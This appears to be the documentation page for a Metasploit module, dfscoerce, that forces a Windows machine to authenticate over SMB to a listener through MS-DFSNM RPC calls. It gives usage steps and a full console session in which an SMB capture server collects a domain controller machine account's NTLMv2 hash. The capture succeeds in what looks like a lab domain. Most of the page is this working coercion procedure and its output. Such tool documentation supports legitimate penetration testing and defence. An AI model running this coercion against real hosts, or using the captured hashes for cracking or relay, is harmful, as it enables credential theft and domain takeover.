## Vulnerable Application

Coerce an authentication attempt over SMB to other machines via MS-DFSNM methods.

## Verification Steps
Example steps in this format (is also in the PR):

1. Install the application
2. Start msfconsole
3. Do: `use auxiliary/scanner/dcerpc/dfscoerce`
4. Set the `RHOSTS` and `LISTENER` options
5. Set the `SMBUser`, `SMBPass` for authentication
6. (Optional) Set the `METHOD` options to adjust the trigger vector
7. Do: `run`

## Options

### LISTENER
The host listening for the incoming connection. The target will authenticate to this host using SMB. The listener host
should be hosting some kind of capture or relaying service.

### METHOD
The RPC method to use for triggering.

## Scenarios

### Windows Server 2019
In this case, Metasploit is hosting an SMB capture server to log the incoming credentials from the target machine
account. The target is a 64-bit Windows Server 2019 domain controller.

```
msf6 > use auxiliary/server/capture/smb 
msf6 auxiliary(server/capture/smb) > run
[*] Auxiliary module running as background job 0.
msf6 auxiliary(server/capture/smb) > 
[*] Server is running. Listening on 0.0.0.0:445
[*] Server started.

msf6 auxiliary(server/capture/smb) > use auxiliary/scanner/dcerpc/dfscoerce 
msf6 auxiliary(scanner/dcerpc/dfscoerce) > set RHOSTS 192.168.159.96
RHOSTS => 192.168.159.96
msf6 auxiliary(scanner/dcerpc/dfscoerce) > set VERBOSE true
VERBOSE => true
msf6 auxiliary(scanner/dcerpc/dfscoerce) > set SMBUser aliddle
SMBUser => aliddle
msf6 auxiliary(scanner/dcerpc/dfscoerce) > set SMBPass Password1
SMBPass => Password1
msf6 auxiliary(scanner/dcerpc/dfscoerce) > run

[*] 192.168.159.96:445    - Connecting to Distributed File System (DFS) Namespace Management Protocol
[*] 192.168.159.96:445    - Binding to \netdfs...
[+] 192.168.159.96:445    - Bound to \netdfs
[+] Received SMB connection on Auth Capture Server!
[SMB] NTLMv2-SSP Client     : 192.168.250.237
[SMB] NTLMv2-SSP Username   : MSFLAB\WIN-3MSP8K2LCGC$
[SMB] NTLMv2-SSP Hash       : WIN-3MSP8K2LCGC$::MSFLAB:971293df35be0d1c:804d2d329912e92a442698d0c6c94f08:01010000000000000088afa3c78cd801bc3c7ed684c95125000000000200120057004f0052004b00470052004f00550050000100120057004f0052004b00470052004f00550050000400120057004f0052004b00470052004f00550050000300120057004f0052004b00470052004f0055005000070008000088afa3c78cd80106000400020000000800300030000000000000000000000000400000f0ba0ee40cb1f6efed7ad8606610712042fbfffb837f66d85a2dfc3aa03019b00a001000000000000000000000000000000000000900280063006900660073002f003100390032002e003100360038002e003200350030002e003100330034000000000000000000

[+] 192.168.159.96:445    - Server responded with ERROR_ACCESS_DENIED which indicates that the attack was successful
[*] 192.168.159.96:445    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/dcerpc/dfscoerce) >
```
